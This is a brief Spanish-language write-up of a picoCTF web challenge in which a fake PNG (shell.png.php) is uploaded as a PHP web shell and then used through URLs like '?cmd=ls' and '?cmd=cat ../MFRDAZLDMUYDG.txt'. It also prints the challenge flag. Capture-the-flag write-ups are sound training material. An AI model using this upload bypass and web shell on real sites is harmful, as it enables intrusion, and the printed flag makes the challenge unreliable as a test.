## Descripción
```
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:63763/)!
```
## Solución
```
Al ingresar al archivo robots.txt obtenemos:

```bash

User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/

flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
```

## Notas 
```
Al obtener informacion de robots.txt subimos la imagen png que realmente no es un png

y posteriormente lo abrimos en la carpeta uploads, seguido de un comando por que esto ahora es un shell de comandos:

`http://atlas.picoctf.net:63763/uploads/shell.png.php?cmd=ls`

hacemos un ls ..

vemos que en la carpeta superior hay un .txt llamado `MFRDAZLDMUYDG.txt`

y por ultimo le hacemos un cat para ver su contenido

`http://atlas.picoctf.net:63763/uploads/shell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt`
```

## Referencias
````

```
